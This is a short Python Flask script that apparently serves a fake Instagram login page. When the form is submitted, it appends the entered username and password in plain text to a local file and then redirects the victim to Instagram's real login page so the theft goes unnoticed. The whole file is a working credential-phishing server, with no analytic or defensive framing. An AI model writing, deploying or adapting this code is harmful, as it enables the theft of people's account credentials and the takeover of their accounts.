from flask import Flask, render_template, redirect, request

app = Flask(__name__)

@app.route("/",methods=["GET","POST"])
def index():
    if request.method=="POST":
        name = request.form['unm']
        pwd = request.form['pwd']
        data = [name, pwd]
        with open("data.txt", 'a') as f:
            f.write("("+str(name)+","+str(pwd)+"),")
        return redirect("https://www.instagram.com/accounts/login")
    else:
        return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)